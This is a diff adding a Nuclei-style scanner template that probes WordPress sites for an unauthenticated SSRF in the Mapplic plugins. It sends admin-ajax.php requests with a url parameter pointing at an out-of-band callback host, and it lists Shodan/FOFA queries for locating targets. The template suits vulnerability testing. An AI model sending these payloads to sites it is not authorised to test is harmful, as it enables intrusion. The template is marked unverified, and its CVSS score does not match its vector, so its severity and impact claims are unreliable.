@@ -1,0 +1,79 @@
+id: mapplic-wordpress-plugin-ssrf
+
+info:
+  name: Mapplic & Mapplic Lite WordPress Plugin - Server-Side Request Forgery (SSRF)
+  author: your-github-username
+  severity: high
+  description: |
+    Mapplic and Mapplic Lite WordPress plugins versions up to 6.1 and 1.0 contain 
+    an unauthenticated server-side request forgery (SSRF) vulnerability. The vulnerability 
+    exists due to insufficient input validation on user-supplied URLs. Attackers can exploit 
+    this to forge HTTP requests from the vulnerable server, potentially accessing internal 
+    network resources or performing XSS attacks through SVG file requests. This can lead to 
+    information disclosure, authentication bypass, and remote code execution.
+  reference:
+    - https://packetstormsecurity.com/files/161919/
+    - https://packetstormsecurity.com/files/161920/
+    - https://www.exploit-db.com/search?q=mapplic
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2021-24409
+    cwe-id: CWE-918
+    cpe: cpe:2.3:a:mapplic:mapplic:*:*:*:*:*:wordpress:*:*
+  tags: wordpress,plugin,ssrf,rce,oast,cve,mapplic,cve2021,unauth
+  metadata:
+    verified: false
+    max-request: 2
+    vendor: mapplic
+    product: mapplic
+    shodan-query: wp-content/plugins/mapplic
+    fofa-query: wp-content/plugins/mapplic
+
+http:
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0
+
+        action=mapplic_load_marker&url=http://{{interactsh-url}}/file.svg&marker=1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+
+      - type: regex
+        part: body
+        regex:
+          - '(?i)(success|true|marker|data|mapplic|json)'
+        condition: or
+
+  - raw:
+      - |
+        GET /wp-admin/admin-ajax.php?action=mapplic_save_marker&url=http://{{interactsh-url}}/payload.svg HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 500
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+
+
